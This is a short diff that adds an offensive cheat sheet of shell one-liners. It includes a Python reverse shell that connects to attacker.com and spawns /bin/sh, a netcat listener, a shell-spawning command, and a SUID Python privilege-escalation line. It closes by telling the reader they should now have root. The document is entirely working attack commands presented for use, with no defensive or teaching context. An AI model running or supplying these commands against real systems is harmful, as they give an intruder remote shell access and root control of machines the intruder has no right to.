@@ -1,0 +1,20 @@
+*Reverse Shell*
+export RHOST=attacker.com //Put current IP here
+export RPORT=12345
+python -c 'import sys,socket,os,pty;s=socket.socket()
+s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))))
+[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
+pty.spawn("/bin/sh")'
+
+
+*Shell Connect*
+nc -lvp -p 1234
+
+*Creates a more stable, user-friendly shell*
+python -c 'import os; os.system("/bin/sh")'
+
+*Escalate privleges*
+./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+
+
+*You should have ROOT with the reverse TCP*
